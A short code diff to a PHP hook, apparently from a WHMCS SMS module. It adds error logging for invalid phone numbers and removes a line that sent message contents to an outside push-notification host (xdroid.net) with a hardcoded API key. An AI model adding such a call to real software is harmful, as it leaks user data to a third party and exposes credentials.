@@ -18,9 +18,6 @@ if (!function_exists('ClientEditClientarea')) {
 
 		$from = urlencode('WHMCS');
 
-		file_get_contents("http://xdroid.net/api/message?k=k-fded099a17cc&t=$message&c=$from&u=http%3A%2F%2Fgoogle.com");
-
-		//Check if Phone Number is Changed.
 		$class    = new Functions();
 		$template = $class->getTemplateDetails(__FUNCTION__);
 		if ($template['is_active'] == 0) {
@@ -36,6 +33,7 @@ if (!function_exists('ClientEditClientarea')) {
 			$client       = mysql_fetch_array($client_query);
 
 			if (!$class->validatePhoneNumber($client['gsmnumber'])) {
+				logActivity('Hook Error: ' . 'Invalid phone number Provided', 0);
 				return null;
 			}
 
